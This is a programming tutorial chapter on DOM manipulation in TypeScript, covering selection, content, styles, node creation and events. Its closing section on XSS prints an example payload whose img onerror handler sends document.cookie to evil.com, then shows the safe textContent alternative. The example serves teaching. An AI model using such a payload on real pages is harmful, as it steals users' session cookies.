## 5.1 What is the DOM?

The **DOM (Document Object Model)** is an **object tree** that the browser constructs after parsing HTML. JavaScript (or TypeScript) can read and modify any content on the page through this tree.

```
document
└── <html>
    ├── <head>
    │   └── <title>
    └── <body>
        ├── <div id="banner">
        │   └── <h1>
        ├── <p class="p1">
        └── <ul>
            ├── <li>
            └── <li>
```

Everything in the DOM is a **Node**, and nodes come in different types:

| Type | Example |
|---|---|
| Element node | `<div>`, `<p>`, `<input>` |
| Text node | Text between tags (including line breaks and whitespace) |
| Comment node | `<!-- comment -->` |
| Document node | The entire `document` object |

## 5.2 Top-Level Nodes and Child Nodes

```typescript
// Three top-level entry points to the DOM tree
const ht = document.documentElement as HTMLHtmlElement; // <html>
const hd = document.head as HTMLHeadElement;            // <head>
const bd = document.body as HTMLBodyElement;            // <body>

// children: contains only child element nodes (<div>, <p>, etc.)
const bdChildren = bd.children as HTMLCollectionOf<Element>;

// childNodes: contains all child nodes, including text nodes (line breaks/spaces) and comment nodes
const bdChildNodes = bd.childNodes as NodeListOf<Node>;
```

> In everyday development you'll almost never directly iterate over `children` / `childNodes`. Understanding them helps you understand the DOM node structure.

## 5.3 Element Selection

There are three methods to get page elements:

```typescript
// getElementById - get a single element by id
const banner = document.getElementById("banner") as HTMLDivElement;

// querySelector - get the first element matching a CSS selector
const p1 = document.querySelector(".p1") as HTMLParagraphElement;   // class
const box = document.querySelector("#content") as HTMLDivElement;   // id
const span = document.querySelector("p > span") as HTMLSpanElement; // nested

// querySelectorAll - get all matching elements; returns a NodeList
const allLi = document.querySelectorAll("li") as NodeListOf<HTMLLIElement>;
```

**Difference between NodeList and Array:**

`querySelectorAll` returns a `NodeList`, which is array-like but not a true array — it only has `forEach`, not `map`, `filter`, `every`, etc. Convert it first when you need those methods:

```typescript
// NodeList → Array
const liArray = Array.from(allLi);
liArray.filter(li => li.classList.contains("active"));
```

## 5.4 Reading and Writing Element Content and Styles

### innerHTML / innerText / textContent

```typescript
const p2 = document.querySelector(".p2") as HTMLParagraphElement;
// Assume p2's HTML is: <p class="p2">Paragraph, <span>special text</span></p>

p2.innerHTML;   // "Paragraph, <span>special text</span>"  ← includes child tags
p2.innerText;   // "Paragraph, special text"               ← plain text; affected by CSS (content hidden with display:none is excluded)
p2.textContent; // "Paragraph, special text"               ← plain text; not affected by CSS; better performance

// Writing
p2.innerHTML = "Hello, <br>World!"; // Parses HTML
p2.innerText = "Hello, <br>World!"; // <br> is displayed as literal text
```

### Manipulating Styles with classList

```typescript
const li = document.querySelector("li") as HTMLLIElement;

li.classList.add("active");     // Add a class
li.classList.remove("active");  // Remove a class
li.classList.toggle("active");  // Add if absent, remove if present
li.classList.contains("active") // Check if class exists → true/false
```

### Inline Styles with style

```typescript
li.style.color = "red";
li.style.backgroundColor = "yellow"; // CSS property names use camelCase
li.style.fontSize = "16px";
```

### Element Attributes

```typescript
const input = document.querySelector("#input1") as HTMLInputElement;

input.type;         // Read the type attribute
input.type = "password"; // Modify the type attribute
input.value;        // Read the current value of the input field
input.checked;      // Whether a checkbox is checked (boolean)
```

## 5.5 Creating, Inserting, and Removing Nodes

```typescript
const ul = document.querySelector("ul") as HTMLUListElement;

// Create a new node
const newLi = document.createElement("li");
newLi.innerHTML = "<a href='#'>New Item</a>";
newLi.classList.add("item");

// Insert nodes
ul.appendChild(newLi);               // Append to the end
ul.insertBefore(newLi, ul.firstChild); // Insert at the beginning

// append can insert multiple nodes or text at once
const text = document.createTextNode("plain text");
const btn = document.createElement("button");
li.append(text, btn);

// Remove nodes
ul.removeChild(newLi); // Parent node removes a specified child node
newLi.remove();        // Node removes itself (more concise)
```

## 5.6 Event Binding

### Three Ways to Bind Events

```typescript
// Method 1: addEventListener (recommended)
// Multiple handlers can be bound to the same event type without overwriting each other
btn.addEventListener('click', () => {
    console.log('Clicked');
});

// Named function, easy to remove later
function handleClick() { console.log('Clicked'); }
btn.addEventListener('click', handleClick);
btn.removeEventListener('click', handleClick); // Remove the listener

// Method 2: onXXX property (can only bind one; new assignment overwrites the old one)
btn.onclick = () => { console.log('Clicked'); };

// Method 3: Inline HTML (not recommended; mixes logic and structure)
// <button onclick="handleClick()">Button</button>
```

### Common Event Types

```typescript
// Mouse events
element.addEventListener('click', handler);       // Click
element.addEventListener('mouseover', handler);   // Mouse enters
element.addEventListener('mouseout', handler);    // Mouse leaves

// Keyboard events
input.addEventListener('keydown', (event) => {
    console.log(event.key);   // Key name, e.g. "Enter", "a"
    console.log(event.code);  // Key code, e.g. "KeyA"
});

// Input field events
input.addEventListener('input', () => {
    console.log(input.value); // Fires every time the input content changes (real-time)
});
input.addEventListener('change', () => {
    console.log(input.value); // Fires when focus is lost and content has changed
});
```

### dataset Custom Data Attributes

In HTML, `data-*` attributes can attach arbitrary data to elements. Read them in JS via `dataset`:

```html
<button class="delete-btn" data-user-id="42">Delete</button>
```

```typescript
const btn = document.querySelector(".delete-btn") as HTMLButtonElement;
console.log(btn.dataset.userId); // "42" (note: it's a string; use Number() to convert)
```

## 5.7 innerHTML and XSS Security Risks

Using `innerHTML` to concatenate content from user input carries an **XSS (Cross-Site Scripting)** risk.

**Dangerous example:**

```typescript
// Assume name comes from user input
const name = `John<img src="x" onerror="fetch('https://evil.com?c='+document.cookie)">`;
result.innerHTML = `<li>${name}</li>`; // The malicious script executes when the page loads
```

**Safe approach: use `createElement` + `textContent`**

```typescript
const li = document.createElement("li");
li.textContent = name; // textContent does not parse HTML; completely safe
result.appendChild(li);
```

> **Rule:** Using `innerHTML` is acceptable when the data source is trusted (your own constants, server-side escaped data). When data comes from user input, you must use `textContent` or `createElement`.
